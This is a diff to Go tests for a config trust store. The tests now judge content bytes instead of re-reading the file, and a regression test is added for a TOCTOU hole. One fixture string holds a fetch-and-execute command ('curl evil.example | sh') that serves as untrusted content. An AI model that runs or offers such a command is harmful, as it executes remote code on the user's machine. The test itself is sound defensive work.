@@ -21,12 +21,36 @@ func writeConfig(t *testing.T, path, content string) {
 	}
 }
 
+// allowFile and isTrustedFile read path and delegate to the real API,
+// which takes the content bytes rather than a path on purpose (see
+// IsTrusted's doc comment): the caller is the only place that can guarantee
+// the bytes it validates are the bytes it acts on. These helpers keep the
+// store-semantics tests below readable without reintroducing that read
+// inside the package under test.
+func allowFile(t *testing.T, path string) error {
+	t.Helper()
+	content, err := os.ReadFile(path)
+	if err != nil {
+		return err
+	}
+	return Allow(path, content)
+}
+
+func isTrustedFile(t *testing.T, path string) (bool, error) {
+	t.Helper()
+	content, err := os.ReadFile(path)
+	if err != nil {
+		return false, err
+	}
+	return IsTrusted(path, content)
+}
+
 func TestIsTrusted_NeverAllowedIsFalse(t *testing.T) {
 	home := isolateEnv(t)
 	path := filepath.Join(home, "envokerc")
 	writeConfig(t, path, "enter /a\n    echo hi\n")
 
-	trusted, err := IsTrusted(path)
+	trusted, err := isTrustedFile(t, path)
 	if err != nil {
 		t.Fatalf("IsTrusted: %v", err)
 	}
@@ -35,16 +59,53 @@ func TestIsTrusted_NeverAllowedIsFalse(t *testing.T) {
 	}
 }
 
-func TestIsTrusted_MissingFileIsFalseNotError(t *testing.T) {
+func TestIsTrusted_NoRecordIsFalseNotError(t *testing.T) {
 	home := isolateEnv(t)
 	path := filepath.Join(home, "does-not-exist")
 
-	trusted, err := IsTrusted(path)
+	trusted, err := IsTrusted(path, []byte("enter /a\n    echo hi\n"))
 	if err != nil {
 		t.Fatalf("IsTrusted: %v", err)
 	}
 	if trusted {
-		t.Errorf("expected missing config to report false")
+		t.Errorf("expected a path with no trust record to report false")
+	}
+}
+
+// TestIsTrusted_JudgesGivenContentNotFileOnDisk is the regression test for a
+// TOCTOU hole: IsTrusted used to re-read the config file itself, so the
+// bytes it hashed were not necessarily the bytes the caller had already
+// parsed and was about to execute. A config could therefore be executed in
+// one version while being validated against another -- swap the file back
+// to its approved content between the two reads and anything ran.
+//
+// Judging exactly the bytes it is handed is what makes that impossible to
+// express: here the file on disk is the approved content, yet asking about
+// different bytes still reports untrusted.
+func TestIsTrusted_JudgesGivenContentNotFileOnDisk(t *testing.T) {
+	home := isolateEnv(t)
+	path := filepath.Join(home, "envokerc")
+	const approved = "enter /a\n    echo hi\n"
+	writeConfig(t, path, approved)
+	if err := allowFile(t, path); err != nil {
+		t.Fatalf("Allow: %v", err)
+	}
+
+	trusted, err := IsTrusted(path, []byte("enter /a\n    curl evil.example | sh\n"))
+	if err != nil {
+		t.Fatalf("IsTrusted: %v", err)
+	}
+	if trusted {
+		t.Errorf("content that was never approved must report untrusted, even when the file on disk is the approved one")
+	}
+
+	// Sanity check the other direction: the approved bytes still pass.
+	trusted, err = IsTrusted(path, []byte(approved))
+	if err != nil {
+		t.Fatalf("IsTrusted: %v", err)
+	}
+	if !trusted {
+		t.Errorf("expected the approved content to report trusted")
 	}
 }
 
@@ -53,11 +114,11 @@ func TestAllow_ThenIsTrusted(t *testing.T) {
 	path := filepath.Join(home, "envokerc")
 	writeConfig(t, path, "enter /a\n    echo hi\n")
 
-	if err := Allow(path); err != nil {
+	if err := allowFile(t, path); err != nil {
 		t.Fatalf("Allow: %v", err)
 	}
 
-	trusted, err := IsTrusted(path)
+	trusted, err := isTrustedFile(t, path)
 	if err != nil {
 		t.Fatalf("IsTrusted: %v", err)
 	}
@@ -71,14 +132,14 @@ func TestIsTrusted_EditAfterAllowRevokesTrust(t *testing.T) {
 	path := filepath.Join(home, "envokerc")
 	writeConfig(t, path, "enter /a\n    echo hi\n")
 
-	if err := Allow(path); err != nil {
+	if err := allowFile(t, path); err != nil {
 		t.Fatalf("Allow: %v", err)
 	}
 
 	// Even a whitespace-only edit must revoke trust.
 	writeConfig(t, path, "enter /a\n    echo hi\n\n")
 
-	trusted, err := IsTrusted(path)
+	trusted, err := isTrustedFile(t, path)
 	if err != nil {
 		t.Fatalf("IsTrusted: %v", err)
 	}
@@ -91,16 +152,16 @@ func TestAllow_ReapprovingAfterEditRestoresTrust(t *testing.T) {
 	home := isolateEnv(t)
 	path := filepath.Join(home, "envokerc")
 	writeConfig(t, path, "enter /a\n    echo hi\n")
-	if err := Allow(path); err != nil {
+	if err := allowFile(t, path); err != nil {
 		t.Fatalf("Allow: %v", err)
 	}
 
 	writeConfig(t, path, "enter /a\n    echo bye\n")
-	if err := Allow(path); err != nil {
+	if err := allowFile(t, path); err != nil {
 		t.Fatalf("Allow (re-approve): %v", err)
 	}
 
-	trusted, err := IsTrusted(path)
+	trusted, err := isTrustedFile(t, path)
 	if err != nil {
 		t.Fatalf("IsTrusted: %v", err)
 	}
@@ -122,15 +183,15 @@ func TestTrust_DistinctPathsDoNotCollide(t *testing.T) {
 	writeConfig(t, pathA, "enter /a\n    echo a\n")
 	writeConfig(t, pathB, "enter /b\n    echo b\n")
 
-	if err := Allow(pathA); err != nil {
+	if err := allowFile(t, pathA); err != nil {
 		t.Fatalf("Allow(a): %v", err)
 	}
 
-	trustedA, err := IsTrusted(pathA)
+	trustedA, err := isTrustedFile(t, pathA)
 	if err != nil {
 		t.Fatalf("IsTrusted(a): %v", err)
 	}
-	trustedB, err := IsTrusted(pathB)
+	trustedB, err := isTrustedFile(t, pathB)
 	if err != nil {
 		t.Fatalf("IsTrusted(b): %v", err)
 	}
@@ -149,7 +210,7 @@ func TestAllow_UsesXDGDataHomeWhenSet(t *testing.T) {
 
 	path := filepath.Join(home, "envokerc")
 	writeConfig(t, path, "enter /a\n    echo hi\n")
-	if err := Allow(path); err != nil {
+	if err := allowFile(t, path); err != nil {
 		t.Fatalf("Allow: %v", err)
 	}
 
@@ -168,7 +229,7 @@ func TestAllow_PreviousContentRoundTrips(t *testing.T) {
 	const cfg = "enter /a\n    echo hi\n"
 	writeConfig(t, path, cfg)
 
-	if err := Allow(path); err != nil {
+	if err := allowFile(t, path); err != nil {
 		t.Fatalf("Allow: %v", err)
 	}
 
@@ -205,13 +266,13 @@ func TestAllow_ReapprovingSupersedesPreviousContent(t *testing.T) {
 	home := isolateEnv(t)
 	path := filepath.Join(home, "envokerc")
 	writeConfig(t, path, "enter /a\n    echo hi\n")
-	if err := Allow(path); err != nil {
+	if err := allowFile(t, path); err != nil {
 		t.Fatalf("Allow: %v", err)
 	}
 
 	const updated = "enter /a\n    echo bye\n"
 	writeConfig(t, path, updated)
-	if err := Allow(path); err != nil {
+	if err := allowFile(t, path); err != nil {
 		t.Fatalf("Allow (re-approve): %v", err)
 	}
 
@@ -226,7 +287,7 @@ func TestAllow_ReapprovingSupersedesPreviousContent(t *testing.T) {
 		t.Errorf("PreviousContent = %q, want %q (the re-approved content)", content, updated)
 	}
 
-	trusted, err := IsTrusted(path)
+	trusted, err := isTrustedFile(t, path)
 	if err != nil {
 		t.Fatalf("IsTrusted: %v", err)
 	}
@@ -254,7 +315,7 @@ func TestIsTrusted_And_PreviousContent_HandlePreUpgradeHashOnlyRecord(t *testing
 		t.Fatalf("WriteFile: %v", err)
 	}
 
-	trusted, err := IsTrusted(path)
+	trusted, err := isTrustedFile(t, path)
 	if err != nil {
 		t.Fatalf("IsTrusted: %v", err)
 	}
